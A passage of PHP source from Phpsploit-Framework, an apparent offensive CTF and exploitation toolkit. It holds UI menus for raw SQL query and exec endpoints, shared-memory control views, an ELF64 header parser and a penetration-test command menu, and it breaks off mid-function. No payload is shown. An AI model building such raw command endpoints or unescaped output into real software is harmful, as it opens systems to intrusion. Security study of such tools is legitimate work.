                    "href"     => Class_Base_Response::get_url ( "/database/query" , array ( "sql" => $params[ "database" ][ "sql" ] , ) ) ,
                ) ,
                array (
                    "title"    => "exec" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/database/exec" , array ( "sql" => $params[ "database" ][ "sql" ] , ) ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-16
 * Time: 下午6:44
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Memory extends Class_View
{
    public static function list_page ( $top = array ( "menu" => null , "content" => null ) , $list = array ( "page" => 1 , "pagesize" => 20 , "total" => 0 , "list" => array () , "search" => "" ) , $bottom = array ( "menu" => null , "content" => null ) )
    {
        if ( ! is_array ( $list ) ) {
            $list = array ();
        }
        if ( ( ! isset( $list[ "page" ] ) ) || ( ! is_integer ( $list[ "page" ] ) ) ) {
            $list[ "page" ] = 1;
        }
        if ( ( ! isset( $list[ "pagesize" ] ) ) || ( ! is_integer ( $list[ "pagesize" ] ) ) ) {
            $list[ "pagesize" ] = 20;
        }
        if ( ( ! isset( $list[ "total" ] ) ) || ( ! is_integer ( $list[ "total" ] ) ) ) {
            $list[ "total" ] = 0;
        }
        if ( ( ! isset( $list[ "list" ] ) ) || ( ! is_array ( $list[ "list" ] ) ) ) {
            $list[ "list" ] = array ();
        }
        if ( ( ! isset( $list[ "search" ] ) ) || ( ! is_string ( $list[ "search" ] ) ) ) {
            $list[ "search" ] = "";
        }
        $_html = self::top ( $top ) . self::list_table ( $list[ "page" ] , $list[ "pagesize" ] , $list[ "total" ] , $list[ "list" ] , $list[ "search" ] ) . self::bottom ( $bottom );
        return $_html;
    }

    public static function list_table ( $page , $page_size , $max_page , $row_total , $list = array () , $search = array ( "action" => null , "name" => null , "value" => null ) )
    {
        $page      = intval ( $page );
        $page_size = intval ( $page_size );
        $row_total = intval ( $row_total );
        if ( ! is_array ( $list ) ) {
            $list = array ();
        }
        if ( ! is_array ( $search ) ) {
            $search = array ();
        }
        if ( ( ! array_key_exists ( "action" , $search ) ) || ( ! is_string ( $search[ "action" ] ) ) ) {
            $search[ "action" ] = "";
        }
        if ( ( ! array_key_exists ( "name" , $search ) ) || ( ! is_string ( $search[ "name" ] ) ) ) {
            $search[ "name" ] = "search";
        }
        if ( ( ! array_key_exists ( "value" , $search ) ) || ( ! is_string ( $search[ "value" ] ) ) ) {
            $search[ "value" ] = "";
        }
        $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Show Share Memory Data List</div>';
        $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface displays all found shared memory data that can be controlled by the Phpsploit Framework software framework.</div>';
        $_list      = '';
        $_list      .= '<div>';
        $_list      .= '<div style="padding-top: 32px;font-size: 18px;"><table style="width:100%;"><tr><td width="20%">search:</td><td width="80%" style="text-align: left;"><form action="' . Class_Base_Format::htmlentities ( Class_Base_Format::action ( $search[ "action" ] ) ) . '" method="post"><input name="' . Class_Base_Format::htmlentities ( $search[ "name" ] ) . '" type="text" value="' . Class_Base_Format::htmlentities ( $search[ "value" ] ) . '" style="width:60%;line-height:24px;font-size:18px;border-width:2px;text-align:center;">&nbsp;&nbsp;<input name="submit" type="submit" value="&nbsp;submit&nbsp;" style="line-height:25px;font-size:20px;border-width:2px;"></form></td></tr></table></div>';
        $_list      .= '<div style="padding-top: 32px;"><table style="width:90%;">';
        $_item_size = 0;
        foreach ( $list as $index => $item ) {
            if ( is_array ( $item ) ) {
                $_item_index = 0;
                if ( $_item_size <= 0 ) {
                    $_item_size = count ( $item );
                }
                $_list .= '<tr>';
                foreach ( $item as $key => $value ) {
                    $_list .= '<td style="text-align: left;padding-top: 14px;padding-bottom: 14px;"><a href="' . $value[ "link" ] . '">' . $key . '</a> : </td><td style="text-align: left;padding-top: 14px;padding-bottom: 14px;padding-right: 64px;">' . $value[ "value" ] . '</td>';
                    $_item_index++;
                }
                while ( $_item_index < $_item_size ) {
                    $_list .= '<td style="text-align: left;padding-top: 14px;padding-bottom: 14px;">&nbsp;</td><td style="text-align: left;padding-top: 14px;padding-bottom: 14px;">&nbsp;</td>';
                    $_item_index++;
                }
                $_list .= '</tr>';
            }
        }
        $_list .= '</table></div>';
        $_list .= '<div style="padding-top: 32px;font-size:18px;"><table style="width:100%;text-align: left;"><tr><td>page:</td><td style="text-align: left;padding-right:32px;">' . $page . '</td><td>page size:</td><td style="text-align: left;padding-right:32px;">' . ( empty( $list ) ? 0 : $page_size ) . '</td><td>max page:</td><td style="text-align: left;padding-right:32px;">' . ( empty( $list ) ? 0 : $max_page ) . '</td><td>row total:</td><td style="text-align: left;padding-right:32px;">' . ( empty( $list ) ? 0 : $row_total ) . '</td><td>to page:</td><td>';
        $_list .= '<select name="page" size="1" style="width:100%;height:32px;line-height:24px;font-size:18px;border-width:2px;text-align:center;" onchange="document.location.href=\'' . Class_Base_Response::get_url ( $search[ "action" ] ) . '&page=\'+this.value+\'&page_size=' . $page_size . '&key=' . Class_Base_Format::htmlentities ( $search[ "value" ] ) . '\';">';
        for ( $index = 1 ; $index <= $max_page ; $index++ ) {
            $_list .= '<option value="' . $index . '" ' . ( ( $page != $index ) ? "" : "selected" ) . '>' . $index . '</option>';
        }
        $_list .= "</select>";
        $_list .= '</td><td width="10%;"></td></tr></table></div>';
        $_list .= '</div>';
        $_form_body = ($_form_top.$_list);
        return $_form_body;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-4
 * Time: 下午8:30
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Section_Header
{
    const ALIAS = 'Elf64_Shdr';

    const SIZE_SH_NAME      = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_SH_TYPE      = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_SH_FLAGS     = Class_Base_Elf64::SIZE_ELF64_XWORD;
    const SIZE_SH_ADDR      = Class_Base_Elf64::SIZE_ELF64_ADDR;
    const SIZE_SH_OFFSET    = Class_Base_Elf64::SIZE_ELF64_OFF;
    const SIZE_SH_SIZE      = Class_Base_Elf64::SIZE_ELF64_XWORD;
    const SIZE_SH_LINK      = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_SH_INFO      = Class_Base_Elf64::SIZE_ELF64_WORD;
    const SIZE_SH_ADDRALIGN = Class_Base_Elf64::SIZE_ELF64_XWORD;
    const SIZE_SH_ENTSIZE   = Class_Base_Elf64::SIZE_ELF64_XWORD;


    const PURPOSE_SH_NAME      = "";
    const PURPOSE_SH_TYPE      = "";
    const PURPOSE_SH_FLAGS     = "";
    const PURPOSE_SH_ADDR      = "";
    const PURPOSE_SH_OFFSET    = "";
    const PURPOSE_SH_SIZE      = "";
    const PURPOSE_SH_LINK      = "";
    const PURPOSE_SH_INFO      = "";
    const PURPOSE_SH_ADDRALIGN = "";
    const PURPOSE_SH_ENTSIZE   = "";

    private static $_elf64_shdrs = array ();

    public $sh_name      = null;
    public $sh_type      = null;
    public $sh_flags     = null;
    public $sh_addr      = null;
    public $sh_offset    = null;
    public $sh_size      = null;
    public $sh_link      = null;
    public $sh_info      = null;
    public $sh_addralign = null;
    public $sh_entsize   = null;

    public static function get_section_header_size ()
    {
        $_section_header_size = ( self::SIZE_SH_NAME + self::SIZE_SH_TYPE + self::SIZE_SH_FLAGS + self::SIZE_SH_ADDR + self::SIZE_SH_OFFSET + self::SIZE_SH_SIZE + self::SIZE_SH_LINK + self::SIZE_SH_INFO + self::SIZE_SH_ADDRALIGN + self::SIZE_SH_ENTSIZE );
        return $_section_header_size;
    }

    public static function get_sh_name_offset ()
    {
        $_offset = ( Class_Base_Elf::OFFSET_START );
        return $_offset;
    }

    public static function get_sh_type_offset ()
    {
        $_offset = ( self::get_sh_name_offset () + self::SIZE_SH_NAME );
        return $_offset;
    }

    public static function get_sh_flags_offset ()
    {
        $_offset = ( self::get_sh_type_offset () + self::SIZE_SH_TYPE );
        return $_offset;
    }

    public static function get_sh_addr_offset ()
    {
        $_offset = ( self::get_sh_flags_offset () + self::SIZE_SH_FLAGS );
        return $_offset;
    }

    public static function get_sh_offset_offset ()
    {
        $_offset = ( self::get_sh_addr_offset () + self::SIZE_SH_ADDR );
        return $_offset;
    }

    public static function get_sh_size_offset ()
    {
        $_offset = ( self::get_sh_offset_offset () + self::SIZE_SH_OFFSET );
        return $_offset;
    }

    public static function get_sh_link_offset ()
    {
        $_offset = ( self::get_sh_size_offset () + self::SIZE_SH_SIZE );
        return $_offset;
    }

    public static function get_sh_info_offset ()
    {
        $_offset = ( self::get_sh_link_offset () + self::SIZE_SH_LINK );
        return $_offset;
    }

    public static function get_sh_addralign_offset ()
    {
        $_offset = ( self::get_sh_info_offset () + self::SIZE_SH_INFO );
        return $_offset;
    }

    public static function get_sh_entsize_offset ()
    {
        $_offset = ( self::get_sh_addralign_offset () + self::SIZE_SH_ADDRALIGN );
        return $_offset;
    }

    public static function create_elf64_shdr ( $filepath , $sh_name , $sh_type , $sh_flags , $sh_addr , $sh_offset , $sh_size , $sh_link , $sh_info , $sh_addralign , $sh_entsize )
    {
        self::$_elf64_shdrs[ $filepath ] = $_elf64_ehdr = new Class_Base_Elf64_Section_Header( $sh_name , $sh_type , $sh_flags , $sh_addr , $sh_offset , $sh_size , $sh_link , $sh_info , $sh_addralign , $sh_entsize );
        return $_elf64_ehdr;
    }

    public function __construct ( $sh_name , $sh_type , $sh_flags , $sh_addr , $sh_offset , $sh_size , $sh_link , $sh_info , $sh_addralign , $sh_entsize )
    {
        $this->sh_name      = $sh_name;
        $this->sh_type      = $sh_type;
        $this->sh_flags     = $sh_flags;
        $this->sh_addr      = $sh_addr;
        $this->sh_offset    = $sh_offset;
        $this->sh_size      = $sh_size;
        $this->sh_link      = $sh_link;
        $this->sh_info      = $sh_info;
        $this->sh_addralign = $sh_addralign;
        $this->sh_entsize   = $sh_entsize;
    }

    public function __destruct ()
    {
        $this->sh_name      = null;
        $this->sh_type      = null;
        $this->sh_flags     = null;
        $this->sh_addr      = null;
        $this->sh_offset    = null;
        $this->sh_size      = null;
        $this->sh_link      = null;
        $this->sh_info      = null;
        $this->sh_addralign = null;
        $this->sh_entsize   = null;
    }

    public function get_sh_name ()
    {
        if ( ( is_string ( $this->sh_name ) ) && ( strlen ( $this->sh_name ) == 4 ) ) {
            $_sh_name = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_name , 0 , 4 ) , "V*" ) ) );
            return $_sh_name;
        }
        return false;
    }

    public function get_sh_type ()
    {
        if ( ( is_string ( $this->sh_type ) ) && ( strlen ( $this->sh_type ) == 4 ) ) {
            $_sh_type = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_type , 0 , 4 ) , "V*" ) ) );
            return $_sh_type;
        }
        return false;
    }

    public function get_sh_flags ()
    {
        if ( ( is_string ( $this->sh_flags ) ) && ( strlen ( $this->sh_flags ) == 8 ) ) {
            $_sh_flags = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_flags , 0 , 8 ) , "Q*" ) ) );
            return $_sh_flags;
        }
        return false;
    }

    public function get_sh_addr ()
    {
        if ( ( is_string ( $this->sh_addr ) ) && ( strlen ( $this->sh_addr ) == 8 ) ) {
            $_sh_addr = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_addr , 0 , 8 ) , "Q*" ) ) );
            return $_sh_addr;
        }
        return false;
    }

    public function get_sh_offset ()
    {
        if ( ( is_string ( $this->sh_offset ) ) && ( strlen ( $this->sh_offset ) == 8 ) ) {
            $_sh_offset = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_offset , 0 , 8 ) , "Q*" ) ) );
            return $_sh_offset;
        }
        return false;
    }

    public function get_sh_size ()
    {
        if ( ( is_string ( $this->sh_size ) ) && ( strlen ( $this->sh_size ) == 8 ) ) {
            $_sh_size = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_size , 0 , 8 ) , "Q*" ) ) );
            return $_sh_size;
        }
        return false;
    }

    public function get_sh_link ()
    {
        if ( ( is_string ( $this->sh_link ) ) && ( strlen ( $this->sh_link ) == 4 ) ) {
            $_sh_link = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_link , 0 , 4 ) , "V*" ) ) );
            return $_sh_link;
        }
        return false;
    }

    public function get_sh_info ()
    {
        if ( ( is_string ( $this->sh_info ) ) && ( strlen ( $this->sh_info ) == 4 ) ) {
            $_sh_info = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_info , 0 , 4 ) , "V*" ) ) );
            return $_sh_info;
        }
        return false;
    }

    public function get_sh_addralign ()
    {
        if ( ( is_string ( $this->sh_addralign ) ) && ( strlen ( $this->sh_addralign ) == 8 ) ) {
            $_sh_addralign = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_addralign , 0 , 8 ) , "Q*" ) ) );
            return $_sh_addralign;
        }
        return false;
    }

    public function get_sh_entsize ()
    {
        if ( ( is_string ( $this->sh_entsize ) ) && ( strlen ( $this->sh_entsize ) == 8 ) ) {
            $_sh_entsize = ( ( Class_Base_Elf::unpack ( substr ( $this->sh_entsize , 0 , 8 ) , "Q*" ) ) );
            return $_sh_entsize;
        }
        return false;
    }

    public function get_format_section_header ()
    {
        $_format_section_header = array ();

        $_format_section_header[ "sh_name" ]          = $this->get_sh_name ();
        $_format_section_header[ "sh_type" ]          = $this->get_sh_type ();
        $_format_section_header[ "hex_sh_type" ]      = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_type" ] ) );
        $_format_section_header[ "sh_type_name" ]     = ( empty( Class_Base_Elf::get_sh_type_name ( $_format_section_header[ "sh_type" ] ) ) ? ( "" ) : ( Class_Base_Elf::get_sh_type_name ( $_format_section_header[ "sh_type" ] ) ) );
        $_format_section_header[ "sh_flags" ]         = $this->get_sh_flags ();
        $_format_section_header[ "sh_addr" ]          = $this->get_sh_addr ();
        $_format_section_header[ "hex_sh_addr" ]      = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_addr" ] ) );
        $_format_section_header[ "sh_offset" ]        = $this->get_sh_offset ();
        $_format_section_header[ "hex_sh_offset" ]    = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_offset" ] ) );
        $_format_section_header[ "sh_size" ]          = $this->get_sh_size ();
        $_format_section_header[ "hex_sh_size" ]      = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_size" ] ) );
        $_format_section_header[ "sh_link" ]          = $this->get_sh_link ();
        $_format_section_header[ "sh_info" ]          = $this->get_sh_info ();
        $_format_section_header[ "sh_addralign" ]     = $this->get_sh_addralign ();
        $_format_section_header[ "hex_sh_addralign" ] = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_addralign" ] ) );
        $_format_section_header[ "sh_entsize" ]       = $this->get_sh_entsize ();
        $_format_section_header[ "hex_sh_entsize" ]   = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $_format_section_header[ "sh_entsize" ] ) );

        return $_format_section_header;
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Guide_PenetrationTestCommands_Menu extends Class_View
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "information_gathering " ,
                    "describe" => "Information Gathering " ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/information_gathering" , array () ) ,
                ) ,
                array (
                    "title"    => "vulnerability_analysis" ,
                    "describe" => "vulnerability analysis" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/vulnerability_analysis" , array () ) ,
                ) ,
                array (
                    "title"    => "web_program" ,
                    "describe" => "web program" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/web_program" , array () ) ,
                ) ,
                array (
                    "title"    => "database_evaluation" ,
                    "describe" => "database evaluation" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/database_evaluation" , array () ) ,
                ) ,
                array (
                    "title"    => "password_attack" ,
                    "describe" => "password attack" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/password_attack" , array () ) ,
                ) ,
                array (
                    "title"    => "wireless_attacks" ,
                    "describe" => "wireless attacks" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/wireless_attacks" , array () ) ,
                ) ,
                array (
                    "title"    => "reverse_engineering" ,
                    "describe" => "reverse engineering" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/reverse_engineering" , array () ) ,
                ) ,
                array (
                    "title"    => "vulnerability_exploitation" ,
                    "describe" => "vulnerability exploitation" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/vulnerability_exploitation" , array () ) ,
                ) ,
                array (
                    "title"    => "sniff_deception" ,
                    "describe" => "sniff deception" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/sniff_deception" , array () ) ,
                ) ,
                array (
                    "title"    => "permission_maintenance" ,
                    "describe" => "permission maintenance" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/permission_maintenance" , array () ) ,
                ) ,
                array (
                    "title"    => "data_forensics" ,
                    "describe" => "data forensics" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/data_forensics" , array () ) ,
                ) ,
                array (
                    "title"    => "reporting" ,
                    "describe" => "reporting" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/reporting" , array () ) ,
                ) ,
                array (
                    "title"    => "social_engineering" ,
                    "describe" => "social engineering" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands/social_engineering" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Memory_Menu
{
    private static $_menu = null;

    public static function menu ()
    {
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "system" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/memory/system" , array ( "rand" => time () ) ) ,
                ) ,
                array (
                    "title"    => "search" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/memory/search" , array ( "rand" => time () ) ) ,
                ) ,
                array (
                    "title"    => "list" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/memory/list" , array ( "rand" => time () ) ) ,
                ) ,
                array (
                    "title"    => "add" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/memory/add" , array ( "rand" => time () ) ) ,
                ) ,
                array (
                    "title"    => "clear" ,
                    "describe" => "" ,
                    "href"     => 'javascript:if(confirm("Are you sure you want to perform the operation of clearing shared memory? Note that after clearing, all discovered and operable shared memory resources will be cleared and released! Execute clear (select \'OK\'), discard clear (select \'Cancel\').")){document.location.href="'.Class_Base_Response::get_url ( "/memory/clear" , array ( "rand" => time () ) ) .'";}',
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File_Download extends Class_Controller
{
    public static function index ( $params = array () )
    {


        Class_Base_Response::output ( Class_View::index () );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-20
 * Time: 下午11:10
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_File_Explorer extends Class_Controller
{
    public static function index ( $params = array () )
    {


        Class_Base_Response::output ( Class_View::index () );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-17
 * Time: 上午9:58
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_ChatMemory extends Class_Operate
{
    const SHARE_MEMORY_KEY = 111111111188888888;

    public static function get_client_sockets ( $share_memory_key = self::SHARE_MEMORY_KEY )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! isset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ] ) ) || ( ! is_array ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ] ) ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ] = array ();
        }
        $_client_sockets = $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ];
        self::init_client_sockets ( $share_memory_key );
        $_share_memory_id = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        for ( $index = 0 ; $index < Class_Base_Memory::BLOCK_SIZE_1048576 ; $index += 8 ) {
            $_client_socket[ $index ] = $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] = Class_Base_Memory::read_share_memory ( $_share_memory_id , $index , 8 , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
        }
        return $_client_sockets;
    }

    public static function init_client_sockets ( $share_memory_key = self::SHARE_MEMORY_KEY )
    {
        $_share_memory_id = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_CREATE );
        if ( ! empty( $_share_memory_id ) ) {
            for ( $index = 0 ; $index < Class_Base_Memory::BLOCK_SIZE_1048576 ; $index += 8 ) {
                Class_Base_Memory::write_share_memory ( $_share_memory_id , 0 , $index , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
                $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] = null;
            }
            @shmop_close ( $_share_memory_id );
        }
    }

    public static function get_client_socket ( $share_memory_key , $share_memory_index )
    {
        if ( ( $share_memory_index >= 0 ) && ( $share_memory_index <= ( Class_Base_Memory::BLOCK_SIZE_1048576 - 8 ) ) ) {
            $_share_memory_id               = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            $_share_memory_block_read_value = $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $share_memory_index ] = Class_Base_Memory::read_share_memory ( $_share_memory_id , $share_memory_index , 8 , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
            return $_share_memory_block_read_value;
        }
        return false;
    }

    public static function set_client_socket ( $share_memory_key , $share_memory_index , $share_memory_value )
    {
        if ( ( $share_memory_index >= 0 ) && ( $share_memory_index <= ( Class_Base_Memory::BLOCK_SIZE_1048576 - 8 ) ) ) {
            $_share_memory_id                                                               = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            $_share_memory_block_write_length                                               = Class_Base_Memory::write_share_memory ( $_share_memory_id , $share_memory_value , $share_memory_index , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $share_memory_index ] = $share_memory_value;
            return $_share_memory_block_write_length;
        }
        return false;
    }

    public static function exist_client_socket ( $share_memory_key , $share_memory_value )
    {
        $_share_memory_id = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( ! empty( $_share_memory_id ) ) {
            for ( $index = 0 ; $index < Class_Base_Memory::BLOCK_SIZE_1048576 ; $index += 8 ) {
                $_client_socket = Class_Base_Memory::read_share_memory ( $_share_memory_id , $index , 8 , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
                if ( $_client_socket == $share_memory_value ) {
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] = $share_memory_value;
                    return true;
                }
            }
        }
        return false;
    }

    public static function write_client_socket ( $share_memory_key , $share_memory_value )
    {
        $_share_memory_id = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_READ_AND_WRITE );
        if ( ! empty( $_share_memory_id ) ) {
            for ( $index = 0 ; $index < Class_Base_Memory::BLOCK_SIZE_1048576 ; $index += 8 ) {
                $_client_socket = Class_Base_Memory::read_share_memory ( $_share_memory_id , $index , 8 , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
                if ( $_client_socket == 0 ) {
